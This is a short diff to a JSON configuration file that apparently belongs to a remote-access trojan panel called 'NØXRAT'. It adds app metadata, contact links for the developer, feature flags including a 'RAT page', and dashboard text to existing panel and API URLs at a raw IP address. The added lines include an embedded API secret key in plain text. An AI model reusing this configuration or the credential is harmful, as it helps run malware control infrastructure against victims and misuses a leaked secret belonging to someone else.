@@ -2,5 +2,28 @@
   "panel_url": "http://38.253.224.75:3031",
   "api_url": "http://38.253.224.75:3031",
   "port": 3031,
-  "version": 1
+  "version": 1,
+
+  "appName": "NØXRAT",
+  "appVersion": "1.0.0",
+  "appBuild": "V2",
+  "aiApiKey": "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",
+
+  "socials": {
+    "telegram": "https://t.me/noprinotdev2",
+    "whatsapp": "https://wa.me/6285218767243",
+    "tiktok": "https://www.tiktok.com/@noprinotdev",
+    "instagram": "https://www.instagram.com/"
+  },
+
+  "features": {
+    "enableAiPage": true,
+    "enableAnimePage": true,
+    "enableRatPage": true
+  },
+
+  "texts": {
+    "loginFooter": "SECURED CONNECTION ESTABLISHED",
+    "dashboardGreeting": "Assalamu'alaikum Warahmatullahi Wabarakatuh"
+  }
 }
